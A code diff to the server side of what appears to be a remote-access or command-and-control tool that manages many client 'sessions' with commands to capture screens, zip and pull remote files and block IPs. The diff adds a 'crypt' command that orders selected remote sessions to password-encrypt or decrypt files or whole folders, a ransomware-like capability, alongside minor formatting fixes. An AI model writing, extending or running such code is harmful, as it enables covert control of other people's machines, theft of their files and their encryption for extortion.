@@ -203,6 +203,23 @@ class Server:
             for address in self.connection.blocked_ips:
                 print(address)
 
+    def crypt(self, action, path_to_open, password, connections):
+        request = {"cmd": "e",
+                   "action": action,
+                   "open_path": path_to_open,
+                   "password": password,
+                   "timeout": self.user_interface.cmd_timeout}
+
+        for connection in connections:
+            self.connection.send(request, connection)
+            valid, response = self.connection.recv(connection, {"error": str, "data": str})
+            if valid:
+                if response["error"]:
+                    self.user_interface.perror(
+                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
+                elif response["data"]:
+                    self.user_interface.poutput(response["data"])
+
 
 class Connection:
     def __init__(self, user_interface):
@@ -274,7 +291,7 @@ class Connection:
             connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
                 connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
-                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} to {packet_number + 1 / (total_packets / 100)}% complete")
+                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
                 sys.stdout.flush()
                 print()
         except socket.error as error:
@@ -288,7 +305,7 @@ class Connection:
             connection.send("READY".encode("utf8"))
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
-                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} to {round(len(data) / (header / 100), 1)}% complete")
+                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
                 sys.stdout.flush()
                 print()
             received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
@@ -367,8 +384,7 @@ class UserInterface(cmd2.Cmd):
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     zip_parser = argparse.ArgumentParser(prog="zip")
-    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level",
-                            choices=range(0, 9))
+    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level", choices=range(10))
     zip_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
     zip_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the zipfile in")
     zip_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
@@ -393,6 +409,12 @@ class UserInterface(cmd2.Cmd):
     block_parser.add_argument("-c", "--close", action="store_true",
                               help="closing sessions from blocked ips which are already established")
 
+    crypt_parser = argparse.ArgumentParser(prog="crypt")
+    crypt_parser.add_argument("-a", "--action", required=True, type=str, choices=["enc", "dec"])
+    crypt_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
+    crypt_parser.add_argument("-p", "--pwd", required=True, type=str, help="password to use")
+    crypt_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+
     def __init__(self, server):
         super().__init__()
         self.server = server
@@ -404,9 +426,9 @@ class UserInterface(cmd2.Cmd):
         self.sock_timeout = 20
         # adding some settings
         self.add_settable(cmd2.Settable("cmd_timeout", int, "clientside timeout before returning from a command",
-                                        choices=range(0, 3600)))
-        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(0, 9)))
-        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data", choices=range(0, 3600)))
+                                        choices=range(3600)))
+        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(10)))
+        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data", choices=range(3600)))
         # delete some builtins
         del cmd2.Cmd.do_py
         del cmd2.Cmd.do_run_pyscript
@@ -500,6 +522,11 @@ class UserInterface(cmd2.Cmd):
     def do_block(self, args):
         """Block a client by ip"""
         self.server.block_address(args.action, args.ips, args.close)
+
+    @cmd2.decorators.with_argparser(crypt_parser)
+    def do_crypt(self, args):
+        """En/decrypt a file or directory with password"""
+        self.server.crypt(args.action, args.read, args.pwd, self.server.connection.get_conn_fgoi(args.sessions))
 
 
 if __name__ == "__main__":
